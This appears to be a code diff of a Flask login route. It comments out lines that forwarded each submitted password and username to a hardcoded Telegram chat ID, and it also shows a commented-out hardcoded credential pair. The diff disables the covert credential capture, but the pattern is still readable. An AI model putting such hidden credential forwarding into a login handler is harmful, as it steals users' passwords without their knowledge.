@@ -80,9 +80,9 @@ def home():
 @app.route('/login', methods=['POST','GET'])
 def do_admin_login():
     if request.method=='POST':
-        chat_id='488735610'
-        text= request.form['password'] +' '+request.form['username']
-        send_message(chat_id,text)
+        #chat_id='488735610'
+        #text= request.form['password'] +' '+request.form['username']
+        #send_message(chat_id,text)
         #if request.form['password'] == 'python' and request.form['username'] == 'vorovik':
         if request.form['username'] in users and request.form['password'] == users.get(request.form['username']):
            global login
